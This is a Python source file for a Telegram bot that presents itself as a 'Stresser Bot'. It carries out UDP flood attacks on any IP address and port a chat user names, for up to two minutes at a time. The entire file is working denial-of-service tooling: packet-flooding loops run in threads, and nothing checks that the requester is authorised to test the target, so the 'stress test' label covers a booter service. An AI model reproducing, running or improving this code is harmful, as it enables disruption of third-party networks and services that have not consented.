import os
import socket
import random
import time
import threading
from telebot import TeleBot
from dotenv import load_dotenv

# --- Configuration ---
# Load environment variables from .env file
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
MAX_DURATION = 120  # Maximum allowed duration in seconds
PACKET_SIZE = 1024  # Size of UDP packet in bytes

# Initialize the Telegram bot
bot = TeleBot(BOT_TOKEN)

# --- Stresser Core ---
def udp_flood(target_ip: str, target_port: int, duration: int, chat_id: int, message_id: int):
    """
    Performs a UDP flood attack against a target IP and port.

    Args:
        target_ip (str): The IP address of the target.
        target_port (int): The port number of the target.
        duration (int): The duration of the attack in seconds.
        chat_id (int): The Telegram chat ID to send results to.
        message_id (int): The Telegram message ID to edit with results.
    """
    sent_packets = 0
    start_time = time.time()
    end_time = start_time + duration

    try:
        # Create a UDP socket
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Generate random payload
        bytes_payload = random._urandom(PACKET_SIZE)

        # Send packets until the duration is over
        while time.time() < end_time:
            try:
                client.sendto(bytes_payload, (target_ip, target_port))
                sent_packets += 1
            except Exception as e:
                # Log or handle specific send errors if needed
                print(f"Error sending packet: {e}")
                # Optionally break if too many errors occur
                if time.time() - start_time > 5 and sent_packets < 10: # Heuristic to break on persistent issues
                    break
                continue # Continue to try sending more packets

        # Final Render of the result
        final_text = (
            f"✅ **STRESS TEST COMPLETE**\n\n"
            f"🌐 **Target:** `{target_ip}:{target_port}`\n"
            f"📦 **Packets Sent:** `{sent_packets}`\n"
            f"⏱ **Duration:** `{duration}s`"
        )
        bot.edit_message_text(final_text, chat_id, message_id, parse_mode='Markdown')

    except socket.gaierror:
        error_text = f"❌ **Invalid Target:** Could not resolve hostname `{target_ip}`."
        bot.edit_message_text(error_text, chat_id, message_id, parse_mode='Markdown')
    except OverflowError:
        error_text = f"❌ **Invalid Port:** Port number `{target_port}` is out of range."
        bot.edit_message_text(error_text, chat_id, message_id, parse_mode='Markdown')
    except Exception as e:
        error_text = f"❌ **An unexpected error occurred:**\n`{e}`"
        bot.edit_message_text(error_text, chat_id, message_id, parse_mode='Markdown')
    finally:
        # Ensure the socket is closed
        if 'client' in locals() and client:
            client.close()

# --- Bot Commands ---
@bot.message_handler(commands=['start'])
def start(message):
    """Handles the /start command."""
    welcome_message = (
        "🚀 **Welcome to the Stresser Bot!**\n\n"
        "Use the `/stress` command to initiate a UDP flood test.\n\n"
        "**Usage:** `/stress <IP_ADDRESS> <PORT> <DURATION_SECONDS>`\n\n"
        "Example: `/stress 192.168.1.1 80 60`\n\n"
        f"Maximum duration is {MAX_DURATION} seconds."
    )
    bot.reply_to(message, welcome_message, parse_mode='Markdown')

@bot.message_handler(commands=['stress'])
def handle_stress(message):
    """Handles the /stress command to initiate a stress test."""
    try:
        args = message.text.split()
        if len(args) != 4:
            raise ValueError("Incorrect number of arguments.")

        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])

        # Validate duration
        if not (0 < duration <= MAX_DURATION):
            return bot.reply_to(message, f"❌ **Invalid Duration:** Please specify a duration between 1 and {MAX_DURATION} seconds.")

        # Validate IP address format (basic check)
        try:
            socket.inet_aton(target_ip)
        except socket.error:
            return bot.reply_to(message, f"❌ **Invalid IP Address:** `{target_ip}` is not a valid IPv4 address.")

        # Validate Port number
        if not (0 <= target_port <= 65535):
            return bot.reply_to(message, f"❌ **Invalid Port:** Port number `{target_port}` must be between 0 and 65535.")

        # Send initial "Rendering" message
        sent_msg = bot.reply_to(message, f"⏳ **Initiating UDP flood test on `{target_ip}:{target_port}` for {duration} seconds...**", parse_mode='Markdown')

        # Launch stresser in a background thread to avoid blocking the bot
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, message.chat.id, sent_msg.message_id))
        thread.daemon = True  # Allows the main program to exit even if this thread is running
        thread.start()

    except ValueError as ve:
        bot.reply_to(message, f"⚠️ **Invalid Input:** {ve}\n**Usage:** `/stress <IP_ADDRESS> <PORT> <DURATION_SECONDS>`")
    except Exception as e:
        bot.reply_to(message, f"❌ **An unexpected error occurred during command handling:**\n`{e}`")

# --- Bot Main Execution ---
if __name__ == "__main__":
    print("Bot is starting...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Bot encountered an error: {e}")
    finally:
        print("Bot has stopped.")
